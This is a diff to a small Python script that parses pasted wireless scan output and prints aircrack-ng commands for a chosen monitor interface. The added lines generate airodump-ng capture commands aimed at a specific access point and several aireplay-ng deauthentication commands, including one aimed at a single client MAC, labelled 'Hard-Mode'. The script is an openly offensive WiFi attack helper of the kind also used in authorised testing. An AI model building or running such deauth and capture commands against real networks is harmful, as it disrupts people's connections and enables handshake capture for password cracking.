@@ -3,7 +3,7 @@ import re
 import os.path
 import os
 derp = input("DUMP your input to start: ")
-wifi_interface = "wlx00c0ca961581"
+wifi_interface = 0
 ch = 0
 L = [derp]
 X = '([a-fA-F0-9]{2}[:|\-]?){6}' # this is the regex
@@ -35,7 +35,7 @@ def check():
         wifi_interface = fo.read()
         # Close opened file
         fo.close()
-        print("wifi interface is set to :",wifi_interface)
+
 
         main()
 
@@ -51,6 +51,8 @@ Anyway
 2. wlan1mon
 3. mon0
 4. mon1
+5. wlan0
+6. wlan1
 U. user defined
 ====================
 Input the Monitor Interface
@@ -98,9 +100,28 @@ Input the Monitor Interface
             fo.close()
             main()
 
+        elif do_this == "5":
+            print("setting to wlan0")
+            wifi_interface = "wlan0"
+            # Open a file
+            fo = open("inter_face.txt", "w+")
+            fo.write(wifi_interface)
+            # Close opend file
+            fo.close()
+            main()
+
+        elif do_this == "6":
+            print("setting to wlan1")
+            wifi_interface = "wlan1"
+            # Open a file
+            fo = open("inter_face.txt", "w+")
+            fo.write(wifi_interface)
+            # Close opend file
+            fo.close()
+            main()
 
         elif do_this in ('U','u'):
-            wifi_interface = input("type in or interface: ")
+            wifi_interface = input("input the mon interface: ")
             # Open a file
             fo = open("inter_face.txt", "w+")
             fo.write(wifi_interface)
@@ -127,7 +148,7 @@ def strip_bssid():
 
             bssid = (s[a.start(): a.end()])
 
-def strip_ssid():
+def strip_ssid(): ### fix this for replay mac not ssid cuz ssid may have spaces but this is still useful
     global L
     global ssid
     ssid = (derp.split()[-1])
@@ -147,12 +168,27 @@ def get_ch():
 
 def finelpirnt():
     global bssid,ssid,wifi_interface
+    print("""
+==========
+INFO
+==========
+""")
     print("WiFi Interface is set to :", wifi_interface)
     print("MAC/BSSID of AP is:",bssid)
     print("SSID of AP is:",ssid)
-    print("Commands Generated...\n")
+    print("Commands Generated...")
+    print("""
+==========
+Listening
+==========""")
 
     print("sudo airodump-ng -w",ssid,"--channel",ch,"--bssid",bssid,wifi_interface)
-    print("sudo aireplay-ng -0 5 -e",ssid,wifi_interface)
+    print("""
+========================
+Replay Stuff For DeAuth
+========================""")
+    print("sudo aireplay-ng -0 5 -e",ssid,wifi_interface,"  <===Normal")
+    print("sudo aireplay-ng -0 5 -a",bssid,wifi_interface,"  <===If SSID has a Space in it")
+    print("sudo aireplay-ng -0 5 -a",bssid,"-c <input target mac here>",wifi_interface,"  <===Hard-Mode")
 
 check()
